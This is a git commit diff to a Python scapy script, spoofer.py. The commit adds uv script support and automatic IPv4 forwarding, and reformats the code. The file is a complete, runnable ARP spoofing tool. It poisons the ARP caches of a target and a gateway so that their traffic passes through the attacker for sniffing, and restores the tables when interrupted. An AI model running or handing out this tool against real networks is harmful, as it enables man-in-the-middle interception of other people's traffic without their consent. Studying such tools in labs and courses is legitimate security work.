c46023dfdf2cfbf8d1b1ef1a69745b06ef6b8fb3
heitzli <luc.heitz@fhnw.ch>
2025-05-19 13:15:58 +0200

    uv support

--- spoofer.py
+++ spoofer.py
@@ -1,11 +1,25 @@
-#!/usr/bin/python
+#!/usr/bin/env -S uv run --script
+# /// script
+# requires-python = ">=3.12"
+# dependencies = ["scapy", "colorama"]
+# ///
+
+import argparse
 
 import scapy.all as scapy
-import argparse
-from colorama import Fore, Style, init
+from colorama import Fore, init
+
+
+def set_ip_forwarding(enable: bool):
+    value = "1" if enable else "0"
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write(value)
+    print(f"IPv4 forwarding {'enabled' if enable else 'disabled'}.")
+
 
 # Initialize colorama
 init(autoreset=True)
+
 
 class ArpSpoofer:
     def __init__(self, target_ip, spoof_ip, interface):
@@ -19,7 +33,9 @@ class ArpSpoofer:
         request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         final_packet = broadcast / request
-        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
+        answer = scapy.srp(
+            final_packet, iface=self.interface, timeout=2, verbose=False
+        )[0]
         mac = answer[0][1].hwsrc
         return mac
 
@@ -34,7 +50,9 @@ class ArpSpoofer:
         # Restores the ARP table of the target to its original state.
         dest_mac = self.get_mac(dest_ip)
         source_mac = self.get_mac(source_ip)
-        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
+        packet = scapy.ARP(
+            op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac
+        )
         scapy.send(packet, iface=self.interface, verbose=False)
         print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")
 
@@ -42,25 +60,47 @@ class ArpSpoofer:
         # Starts the ARP spoofing attack by continuously sending spoofed packets.
         # Restores ARP tables upon interruption (CTRL+C).
         try:
+            set_ip_forwarding(True)
             while True:
                 self.spoof(self.target_ip, self.spoof_ip)  # Spoof the target IP
                 self.spoof(self.spoof_ip, self.target_ip)  # Spoof the spoofed IP
         except KeyboardInterrupt:
-            print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
+            set_ip_forwarding(False)
+
+            print(
+                Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait."
+            )
             self.restore(self.target_ip, self.spoof_ip)
             self.restore(self.spoof_ip, self.target_ip)
             print(Fore.GREEN + "[+] ARP tables restored.")
 
+
 if __name__ == "__main__":
     # Setting up argparse for command-line arguments
-    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
-    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
-    parser.add_argument("-s", "--spoof", required=True, help="Spoofed IP address (e.g., the gateway IP).")
-    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0).")
+    parser = argparse.ArgumentParser(
+        description="ARP Spoofing Tool to sniff network traffic."
+    )
+    parser.add_argument(
+        "-t", "--target", required=True, help="Target IP address to spoof."
+    )
+    parser.add_argument(
+        "-s",
+        "--spoof",
+        required=True,
+        help="Spoofed IP address (e.g., the gateway IP).",
+    )
+    parser.add_argument(
+        "-i",
+        "--interface",
+        required=True,
+        help="Network interface to use (e.g., eth0, wlan0).",
+    )
 
     # Parse the arguments
     args = parser.parse_args()
 
     # Create an ArpSpoofer object and start the spoofing process
-    spoofer = ArpSpoofer(target_ip=args.target, spoof_ip=args.spoof, interface=args.interface)
+    spoofer = ArpSpoofer(
+        target_ip=args.target, spoof_ip=args.spoof, interface=args.interface
+    )
     spoofer.run()
